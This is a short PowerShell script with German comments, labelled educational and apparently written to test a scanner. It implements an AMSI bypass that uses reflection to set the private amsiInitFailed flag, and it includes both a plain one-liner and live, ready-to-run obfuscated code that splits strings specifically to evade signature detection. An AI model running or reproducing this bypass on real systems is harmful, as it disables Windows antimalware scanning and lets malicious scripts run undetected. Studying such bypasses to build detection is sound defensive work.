# AMSI Bypass: amsiInitFailed via Reflection
# ============================================
# ACHTUNG: Dies ist eine BILDUNGSDATEI. Nicht auf Produktivsystemen ausfuehren!
#
# TECHNIK: Setzt das interne Flag "amsiInitFailed" auf True.
# Wenn AMSI denkt, die Initialisierung sei fehlgeschlagen,
# ueberspringt es alle weiteren Scans.
#
# WARUM ES FUNKTIONIERT:
# PowerShell speichert den AMSI-Zustand in einer privaten statischen Variable
# der Klasse System.Management.Automation.AmsiUtils. Wenn "amsiInitFailed"
# auf True gesetzt wird, gibt AmsiUtils.ScanContent() sofort "clean" zurueck,
# ohne den AMSI-Provider aufzurufen.
#
# ERKENNUNG DURCH UNSEREN SCANNER:
# Der Scanner erkennt "amsiutils" und "amsiinitfailed" als suspicious patterns.
# Dieser Bypass erfordert also ZUSAETZLICHE Obfuskation um auch unseren Scanner
# zu umgehen.

# --- Klartext-Version (wird erkannt) ---
# [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# --- Obfuskierte Version (umgeht String-Matching) ---
$a = [Ref].Assembly.GetType(
    ('System.Manage' + 'ment.Auto' + 'mation.Am' + 'si' + 'Utils')
)
$f = $a.GetField(
    ('am' + 'si' + 'Init' + 'Failed'),
    'NonPublic,Static'
)
$f.SetValue($null, $true)

Write-Host "AMSI status modified"
# Ab hier werden PowerShell-Befehle nicht mehr durch AMSI gescannt
Write-Host "malware test - should not trigger AMSI anymore"
